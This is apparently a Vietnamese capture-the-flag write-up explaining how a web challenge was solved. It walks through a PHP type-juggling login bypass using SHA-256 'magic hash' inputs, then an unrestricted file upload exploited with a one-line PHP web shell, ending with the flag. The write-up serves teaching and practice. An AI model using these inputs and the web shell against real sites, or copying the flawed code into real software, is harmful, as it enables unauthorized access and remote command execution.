Quan sát source code và chức năng đăng nhập

```php
if(isset($_POST['submit'])){ 
    $usr = mysql_real_escape_string($_POST['username']); 
    $pas = hash('sha256', mysql_real_escape_string($_POST['password'])); 
    
    if($pas == "0"){ 
        $_SESSION['logged'] = TRUE; 
        header("Location: upload.php"); // Modify to go to the page you would like 
        exit; 
    }else{ 
        header("Location: login_page.php"); 
        exit; 
    } 
}else{    //If the form button wasn't submitted go to the index page, or login page 
    header("Location: login_page.php");     
    exit; 
}
```

Chú ý sẽ thấy có 1 phần như sau

```php
if($pas == "0")
```

Đây là lỗi **php juggling** khi php cố gắng ép kiểu dữ liệu.

Nếu như **$pas** sau khi được sha256 có dạng `0exxxxxxx....` thì ký tự đầu tiên của **$pas** sẽ được đem so sánh với `"0"` là bằng nhau

Tôi đã tìm được đầu vào thỏa mãn:
| Hash | Number/String | Magic Hash |
| --- | --- | --- |
| SHA-256 | 34250003024812 | 0e46289032038065916139621039085883773413820991920706299695051332 |
| SHA-256 | TyNOQHUS | 0e66298694359207596086558843543959518835691168370379069085300385 |

Sau khi vào được trang /upload.php

```php
if(isset($_FILES['fileData'])){
    if($_FILES['fileData']['size'] > 1048576){
        $errors='File size must be excately 1 MB';
    }

    if(empty($errors)==true){
    $uploadedPath = "uploads/".rand().".".explode(".",$_FILES['fileData']['name'])[1];
    move_uploaded_file($_FILES['fileData']['tmp_name'],$uploadedPath);
    echo "File uploaded successfully\n";
    echo '<p><a href='. $uploadedPath .' target="_blank">File</a></p>';
    }else{
        echo $errors;
    }
}
```

Nhận thấy file upload lên không được filter extension, upload file php với payload sau:

```php
<?php system($_GET['cmd'])>;?>
```

![image](https://github.com/lucthienphong1120/CookieArena-CTF/assets/90561566/fed2b00d-10d2-4c38-a6e0-587c71f76f3b)

```CHH{PHP_m4g1c_tr1ck_0lD_but_g0lD_fdc8987c7c633ce8f9f5f2ae4599a9c8}```
